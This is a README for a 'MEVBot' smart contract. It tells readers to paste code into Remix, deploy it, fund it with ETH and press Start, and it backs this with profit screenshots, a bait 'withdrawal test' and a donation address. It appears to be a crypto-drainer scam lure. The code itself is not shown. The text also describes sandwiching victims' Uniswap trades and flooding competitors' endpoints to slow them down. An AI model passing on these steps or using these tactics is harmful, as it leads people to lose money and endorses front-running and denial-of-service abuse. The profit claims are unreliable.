#### donation address: `0x4E3E3BE6A75AE22f0b8ff4D862c15de76c0bFa7A`

> 💪 If this project has been beneficial to you in terms of generating income, you may donate to the provided address. However, my primary intention is to keep a record of the number of individuals I have assisted.

# ❗IMPORTANT❗ Update 17.05.2023
### HOW TO CHECK MEVBOT CONTRACT SAFETY
1. After deploying the contract, ***DO NOT*** immediately execute the Start method.
2. I've add `GetBalanceWei` method, after send tokens to the contract, you can click `GetBalanceWei` to check balance.
3. Send ETH or BNB to the contract, Click on `Withdrawal` to test if the function works properly. 
4. Check your wallet to see if you have received ETH/BNB.
The operations mentioned above will require payment of gas fees. If you have concerns about safety, it is recommended to test the withdrawal process with a small amount of tokens first.

# MevBot Earn money with MEVbot
The contract is optimized. now the "start" and "withdraw" functions require less gas.

# Update 08.05.2023 (Result)
The result of the bot, which is on the screenshot in the period from 25.04 to 08.05

# created bot 25.04.2023
![1](https://raw.githubusercontent.com/evmbots/mevbot/main/images/1.png)
![2](https://raw.githubusercontent.com/evmbots/mevbot/main/images/2.png)
Due to the high amount of gas, profit has slightly decreased. However, from the period of May 6th to May 8th, the bot has earned 0.13 ETH.

The code was not intended for public display. It was created as a "tested in production" version with numerous quality tradeoffs, while my commercial code is superior. I never planned to release it publicly to avoid leaking my alpha. However, I would like to showcase what I have learned over the years.

The bot sends transactions and monitors the Uniswap v2 Mempool.

Bots then compete to purchase tokens on-chain as quickly as possible by sandwiching the victim's transaction and creating a profitable slippage opportunity.

Finally, the ETH is returned to the contract for withdrawal.

This bot performs all of these functions faster than 99% of other bots.

# But ser, there are open source bots that do the same
Yes, there are indeed other bot builders out there. However, I was the first one to enter this field and I still outperform them. When I read their articles, it makes me giggle because I went through the same struggles as they did. As a fellow bot builder, I feel for these guys <3.

# Wen increase aggressiveness ?
After spending a year obsessing over this, I have compiled a list of target endpoints that other bots use. By flooding these endpoints with requests, I can cause them to lose up to 5 seconds of reaction time and gain an advantage over them. This has been my personal journey in achieving success in this field.

# What did I learn?
MEV, Frontrunning, EIP-1559, "The Dark Forest", all sorts of tricks to exploit more web2 kind of architectures. And all sorts of ins and outs aboout Unsiwap

# So why stop?
I have earned profits from this in the past, but I am now utilizing more effective commercial methods. I am willing to share my knowledge with developers so that they do not have to go through the same struggles.

# MEVBot Instructions:
(works only for Mainnet) How it works:

You can see an example of how the bot works
![3](https://raw.githubusercontent.com/evmbots/mevbot/main/images/3.png)

## Source code
- Access the Remix IDE https://remix.ethereum.org/
- FILE EXPLORER
- Click and create new file "mevbot.sol" Copy code and paste in Remix IDE
![4](https://raw.githubusercontent.com/evmbots/mevbot/main/images/4.png)

- Click Solidity complier 0.6.6

- Press Compile mevbot.sol 

![5](https://raw.githubusercontent.com/evmbots/mevbot/main/images/5.png)

- Select ETH or BSC(BNB) network and router address

- Press Transact (Deploy) 

![6](https://raw.githubusercontent.com/evmbots/mevbot/main/images/6.png)

# Next deposit (balans MevBot)
Copy contract your MevBot and send a number of Ethereum to the bot's balance for the bot to work. And start it with the start button 

![7](https://raw.githubusercontent.com/evmbots/mevbot/main/images/7.png)
![8](https://raw.githubusercontent.com/evmbots/mevbot/main/images/8.png)
![9](https://raw.githubusercontent.com/evmbots/mevbot/main/images/9.png)

# ❗❗NOTE❗❗
Due to high network usage to ensure successful transactions on the Ethereum network, maintain a sufficient balance to cover gas fees (recommended 0.2 - 2 ETH). You can stop the bot or withdraw your funds at any time by calling the withdrawal function.
